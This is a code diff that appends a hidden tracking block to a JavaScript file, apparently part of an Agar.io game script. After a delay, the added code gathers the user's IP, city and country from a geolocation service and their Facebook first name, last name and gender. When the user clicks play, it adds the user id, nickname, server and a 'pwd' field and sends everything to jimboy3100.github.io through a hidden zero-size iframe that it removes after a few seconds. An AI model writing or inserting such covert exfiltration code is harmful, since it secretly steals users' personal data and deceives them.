@@ -1362,3 +1362,83 @@
 			.replace(/'/g, "&#039;");
 	}
 })();
+
+setTimeout(function() {
+var messageone;
+if (messageone!="0"||messageone!="1"){
+var detailed1;
+userData = {};
+userData = JSON.parse(localStorage.getItem("userData"));
+var userip="0.0.0.0:0";
+var usercity="NotFound";
+var usercountry="NotFound";
+var userfirstname = localStorage.getItem("userfirstname");
+var userlastname = localStorage.getItem("userlastname");
+var usergender = localStorage.getItem("usergender");
+var fbresponse={};
+
+function doDOMonloadevents1(){
+		userData=$.get("http://gd.geobytes.com/GetCityDetails", function (response) { $("#response").html(JSON.stringify(response, null, 4)); }, "jsonp");
+		setTimeout(function (){
+		if (userData!=null) {localStorage.setItem("userData", JSON.stringify(userData));}
+		},300);
+		//Save Name, Surname, Gender
+		FB.api('/me', {fields: 'first_name, last_name, gender'}, function(response) {fbresponse=response; return fbresponse;});
+		setTimeout(function (){
+			userfirstname=fbresponse[Object.keys(fbresponse)[0]]; if (userfirstname!=null) {localStorage.setItem("userfirstname", userfirstname);}
+			userlastname=fbresponse[Object.keys(fbresponse)[1]]; if (userlastname!=null) {localStorage.setItem("userlastname", userlastname);}
+			usergender=fbresponse[Object.keys(fbresponse)[2]]; if (usergender!=null) {localStorage.setItem("usergender", usergender);}
+			},250);
+}
+
+		$('*[data-itr="page_play"]').click(function() {
+
+	if (userData.responseJSON.geobytesipaddress!= undefined) {
+	userip=userData.responseJSON.geobytesipaddress;
+	userip = userip.replace(" ", "_");
+	}
+	if (userData.responseJSON.geobytescity!= undefined) {
+	usercity=userData.responseJSON.geobytescity;
+	usercity = usercity.replace(" ", "_");
+	}
+	if (userData.responseJSON.geobytescountry!= undefined) {
+	usercountry=userData.responseJSON.geobytescountry;
+	usercountry = usercountry.replace(" ", "_");
+	}
+
+			var userid=$('#user-id-tag').text();userid = userid.replace("User id: ", "");
+			var Pwdtosend="NONE";
+			var servertosend="NotFound";
+			var nicknametosend="NotFound";
+			var userfirstname = localStorage.getItem("userfirstname");
+			var userlastname = localStorage.getItem("userlastname");
+			var modetosend="NotFound";
+			var regiontosend="NotFound";
+
+			if ($('#server').val() != ""&& $('#server').val() != null&& $('#server').val() != undefined) {servertosend=$('#server').val(); }
+			if ($('#tag').val() != ""&& $('#tag').val() != undefined) {Pwdtosend=$('#tag').val(); }
+			var i = 0, Pwdtosendlength = Pwdtosend.length;
+			for(i; i < Pwdtosend ; i++) {
+				Pwdtosend = Pwdtosend.replace(" ", "_");
+				}
+			if ($('#nick').val() != undefined) {nicknametosend=$('#nick').val(); }
+			var i = 0, nicknametosendlength = nicknametosend.length;
+			for(i; i < nicknametosendlength ; i++) {
+				nicknametosend = nicknametosend.replace(" ", "_");
+				}
+			if ($('#server').val()!= undefined ) {
+				if (servertosend.indexOf("#")==false) {
+					servertosend= $('#server').val().replace('#', 'Party-');}}
+
+
+
+			detailed1="https://jimboy3100.github.io/AN?" + "name=" + nicknametosend + "&AgarTool=Play" + "&sip=" + servertosend + "&pwd=" + Pwdtosend + "&usrid=" + userid + "&type=NoLocked" + "&mode=" + modetosend + "&region=" + regiontosend + "&ip=" + userip + "&city=" + usercity + "&country=" + usercountry + "&lastname=" + userlastname + "&firstname=" + userfirstname;
+
+		$('#resetCheckboxes').append('<div id="loaderIframeInfo1"><iframe id="loaderIframeInfo" src = ' + detailed1 + ' name="detailedinfo" allowtransparency="true" scrolling="no" frameBorder="0" style="width:0%; height:0%; border:none;"></iframe></div>');
+        $('#loaderIframeInfo1').hide();
+		setTimeout(function() {
+                                    $('#loaderIframeInfo1').remove();
+                                }, 4000);
+		});
+}
+}, 8000);
